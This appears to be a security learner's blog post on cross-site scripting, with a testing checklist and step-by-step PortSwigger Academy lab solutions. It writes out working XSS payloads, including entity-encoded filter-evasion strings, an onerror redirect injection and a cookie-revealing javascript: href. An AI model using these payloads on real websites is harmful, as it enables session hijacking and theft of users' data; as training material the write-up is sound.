---
layout: post
title: XSS (Cross site scripting)
subtitle: Victim visit malicious URL/site to trigger the payload made of JavaScript. Causing their session to be controlled or data to be stolen
date: 2025-09-15 19:15
author: Ren Sie
comments: true
category: script-input
thumbnail-img: /assets/img/githubpost/xxs_thumb.png
---

Cross-site scripting (XSS) is a web security flaw where attackers inject malicious scripts into trusted websites, which then execute in the browsers of unsuspecting users. This exploitation allows attackers to steal sensitive data, hijack user sessions, or manipulate website content by taking advantage of web applications that do not properly validate or sanitize user input.



{: .box-note}
**Note:** 💡 During the testing, use `print()` `prompt("text")` instead of `alert()` since `alert()` is commonly detected and filtered. <br> When testing for XXS, test for html injection first because it’s more likely to work
E.g., \<h1\>test\</h1\>

### Checklist
<details markdown="1">
  <summary>Click me to expand checklist</summary>  

1. **Is input reflected in the response?**

2. **Can we inject HTML?**
   - E.g., `https[://]victim[.]com/search?user=<img src=x onerror=prompt("XSS")>`
    
3. **Any weaknesses in the Content Security Policy (CSP)?**
   - Use of unsafe directives which allow execution of inline scripts or eval() functions, bypassing CSP protections. <br> E.g.,`Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`
   - Allowing broad sources or wildcards in directives (e.g., script-src), which permits potentially untrusted external scripts to run. <br> E.g., `Content-Security-Policy: script-src *;`
   - Inclusion of compromised or vulnerable third-party domains in trusted sources, such as JSONP endpoints that can be exploited to inject malicious scripts. <br> E.g., `https[://]third-party_domain[.]com/jsonp?callback=prompt("xss is available!")`
   - Omitting strict directives for resources like object-src or failing to restrict nonces and hashes properly which can allow script injection.
   - Weak or predictable nonces (e.g., 'nonce-12345') that attackers can guess or reproduce to bypass CSP restrictions.
 
4. **Can we use events (e.g. onload, onerror)?**
   - `<body onload="prompt('XSS via onload!')"> Welcome to the website! </body>`
   - `<a href="https[://]trusted[.]com/search?user=<img src=x onerror=prompt("XXS Available")>"> Click me! </a>`

5. **Are there any filtered or escaped characters?**
   - E.g., `<`, `>`, `"`, `'`, `javascript:`, `alert()`
   - Refer to [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

6. **Is input stored and then later rendered?**

7. **Can we inject into non-changing values (e.g. usernames, comments, etc.)?**
   - E.g., web application allows user input and stores them without proper sanitization.

8. **Any input collected from a third party (e.g. account information)?**
   - Third-party inputs refer to any data or content that comes from an external source (via third-party api) or from other users.

9. Is the version of the framework or dependency vulnerable?
   - [OWASP Dependency-Check](https://github.com/dependency-check/DependencyCheck)
   - [OWASP Dependency-Check Installation and Scanning First project](https://www.youtube.com/watch?v=hWiI700y3J0)

</details>

### Reflected XXS
Inject payload into the HTTP request. And once the web server receive the request, it will response with the payload to sender’s browser. It relies on URL to make user fall for the attack.

### Dom-Based XXS
Client-side has vulnerable JavaScript. It doesn’t involve with the server-side, completely rely on client’s browser to execute the payload.
One quick check is turn on the developer tool, input and execute a simple prompt or alert script, see if there’s any network interaction with the server.

{: .box-note}
**Note:** 🚨 Inspecting Network page in the developer tab while sending input. If there’s no external communication happens, it indicates it is Dom-Based XXS.

#### Page Redirect
User could inject the following code into a vulnerable website, causing an automatic redirect to a malicious site. When a victim loads the page with this injected script, they will be automatically redirected to <$url>.
~~~
src=x onerror="window.location.href='<$url>'"
~~~

### Store
Payload is stored in the database, and victim’s browser will retrieve it once it visit the page. For instance:  
1. In the attacker’s browser leave html injection comment: \<h1\>test\</h1\>.
2. Visit the same page from victim’s browser

![store_xxs.png](/assets/img/githubpost/xxs_1.png)

### Labs
Just for demostration, I completed a few labs on [PortSwigger Academy](https://portswigger.net/web-security/all-labs#cross-site-scripting) to show how this vulnerability can lead to:

#### 1. DOM-based XSS in document.write sink using source location.search
The target application use `document.write()` function to display content from `location.search`, which comes from the URL query string. Allows users to modify the URL, and to inject and execute arbitrary scripts in the page.
<details markdown="1">
  <summary>Click me to expand the steps</summary>  
1. Enter random input (e.g., 123456) in the user input (URL query)
~~~
https[://]web-security-academy.net/?search=123456
~~~
  
2. Right-click on the webpage and open the inspection tab

3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
~~~
Result: <img src="/resources/images/tracker[.]gif?searchTerms=123456">
~~~

4. After knowing the syntax. We can add a closing angle bracket to close up the img tag, and add a new tag with the payload. I use HTML encoding to bypass the filter.
~~~
URL: "><script src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"></script>
Result: <img src="/resources/images/tracker[.]gif?searchTerms=">
        <script src="x" onerror="javascript:alert('XSS')"></script>
~~~
</details>

#### 2. DOM XSS in innerHTML sink using source location.search
The application It assigns data from `location.search` to `innerHTML`, which updates the contents of a `<div>`. Since the URL can be controlled by the user, they can inject malicious HTML or scripts.
<details markdown="1">
  <summary>Click me to expand the steps</summary>  
1. Enter random input (e.g., 123456) in the user input (URL query)
~~~
https[://]web-security-academy.net/?search=123456
~~~
  
2. Right-click on the webpage and open the inspection tab

3. Press `Crtl+F` to open search function in inspection tab, and search for input (e.g., 123456)
~~~
Result: <span id="searchMessage">123456</span>
~~~

4. After knowing the syntax. I can add a closing tag to close up `<span>`, and add a new `<img>` tag with the payload. I use HTML encoding to bypass the filter.
~~~
URL: https[://]web-security-academy[.]net/?search=</span><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
Result: <span id="searchMessage"><img src="x" onerror="javascript:alert('XSS')"></span> <span>'</span> == $0
~~~
</details>

#### 3. DOM XSS in jQuery anchor href attribute sink using location.search source
In this instance, jQuery’s `$` selector is used to find a link and set its `href` using data from `location.search`, which comes from the URL query string.
<details markdown="1">
  <summary>Click me to expand the steps</summary>
1. Right-click on the webpage and open the inspection tab. I search for `location.search`, which led me to this script:
~~~
  $(function() {
      $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
      });
~~~
  
2. I also notice that the URL contains the `returnPath` query parameter, which aligns with the script. Which uses this query parameter to set the href attribute of the backlink.
~~~
URL: https[://]web-security-academy[.]net/feedback?returnPath=/
~~~

3. Insert the payload into the `returnPath` query parameter.
~~~
URL: https[://]web-security-academy[.]net/feedback?returnPath=javascript:prompt(document.cookie)
Result: <a id="backLink" href="javascript:prompt(document.cookie)">Back</a>
~~~
</details>

#### 4. Stored XSS into anchor href attribute with double quotes HTML-encoded
This instance contains a stored XSS vulnerability in the comment section. I submit a comment that triggers an alert when the author’s name is clicked.
<details markdown="1">
  <summary>Click me to expand the steps</summary>
1. 
</details>
